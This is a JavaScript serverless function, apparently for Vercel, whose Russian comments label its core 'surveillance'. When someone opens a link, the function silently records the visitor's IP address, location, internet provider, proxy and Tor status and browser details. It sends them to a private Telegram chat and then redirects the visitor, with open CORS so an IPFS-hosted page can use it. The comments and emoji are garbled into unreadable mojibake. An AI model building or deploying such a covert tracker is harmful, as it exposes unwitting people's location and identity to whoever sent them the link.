// –≠—Ç–æ—Ç –∫–æ–¥ –∏—Å–ø–æ–ª–Ω—è–µ—Ç—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ Vercel, –∞ –Ω–µ –≤ –±—Ä–∞—É–∑–µ—Ä–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è!

// –•–µ–ª–ø–µ—Ä –¥–ª—è —Ñ–ª–∞–≥–∞ —Å—Ç—Ä–∞–Ω—ã
const getFlagEmoji = (countryCode) => {
    if (!countryCode || countryCode.length !== 2) return 'üè≥Ô∏è';
    const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
    return String.fromCodePoint(...codePoints);
};

export default async function handler(req, res) {
    // --- –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ –∫–ª—é—á–∏ –∏–∑ –±–µ–∑–æ–ø–∞—Å–Ω—ã—Ö –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è Vercel ---
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;
    const IPDATA_API_KEY = process.env.IPDATA_API_KEY;
    const REDIRECT_URL = process.env.REDIRECT_URL;

    // --- –ù–ê–ß–ê–õ–û –°–õ–ï–ñ–ö–ò (–ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ) ---
    try {
        // –ü–æ–ª—É—á–∞–µ–º IP –∏ User-Agent –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤ –∑–∞–ø—Ä–æ—Å–∞
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'];

        // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–µ—Ç–∞–ª—å–Ω—É—é –∏–Ω—Ñ—É –ø–æ IP —Å ipdata.co
        const ipdataResponse = await fetch(`https://api.ipdata.co/${ip}?api-key=${IPDATA_API_KEY}`);
        const data = await ipdataResponse.json();
        
        const flag = data.emoji_flag || getFlagEmoji(data.country_code);

        const message = `
${flag} New Visit [Vercel]:
üìåIP: ${data.ip}
üåéLocation: ${data.country_name}, ${data.region}, ${data.city}
üß®Provider: ${data.asn.name}
üí´Threat: Proxy: ${data.threat.is_proxy}, Tor: ${data.threat.is_tor}
ü¶äUser-Agent: ${userAgent}
        `;
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ª–æ–≥ –≤ Telegram (–∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ, –Ω–µ –∂–¥–µ–º –æ—Ç–≤–µ—Ç–∞)
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
        fetch(telegramUrl);

    } catch (error) {
        // –ï—Å–ª–∏ —Å–ª–µ–∂–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å, —ç—Ç–æ –Ω–µ –¥–æ–ª–∂–Ω–æ —Å–ª–æ–º–∞—Ç—å —Ä–µ–¥–∏—Ä–µ–∫—Ç
        console.error("Tracking failed:", error);
    }
    // --- –ö–û–ù–ï–¶ –°–õ–ï–ñ–ö–ò ---

    // --- –û–¢–î–ê–ï–ú URL –î–õ–Ø –†–ï–î–ò–†–ï–ö–¢–ê ---
    // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º CORS, —á—Ç–æ–±—ã –±—Ä–∞—É–∑–µ—Ä –Ω–µ –±–ª–æ–∫–∏—Ä–æ–≤–∞–ª –∑–∞–ø—Ä–æ—Å —Å IPFS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.status(200).json({ redirectTo: REDIRECT_URL });
}


